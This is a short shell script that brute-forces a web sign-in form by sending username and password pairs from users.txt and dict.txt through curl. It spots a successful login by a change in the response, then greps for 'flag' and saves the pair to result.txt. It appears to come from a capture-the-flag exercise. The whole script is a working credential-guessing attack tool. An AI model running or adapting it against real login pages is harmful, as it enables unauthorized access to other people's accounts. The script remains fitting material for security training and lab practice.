#!/bin/sh
curl -s "http://$1/?page=signin&username=a&password=a&Login=Login#" > page
while IFS='' read -r user; do
	echo "try user : $user"
	url1="http://$1/?page=signin&username="
	url2="&password="
	url3="&Login=Login#"
	while IFS='' read -r line; do
			echo "\ttry password: $line"
			curl -s "$url1$user$url2$line$url3" > tested
			DIFF=$(diff page tested)
			if [ "$DIFF" != "" ]
			then
					cat tested | grep "flag"
					echo "user is : $user\npassword is $line" >> result.txt
					rm tested
					break
			fi
			rm tested
	done < "dict.txt"
done < "users.txt"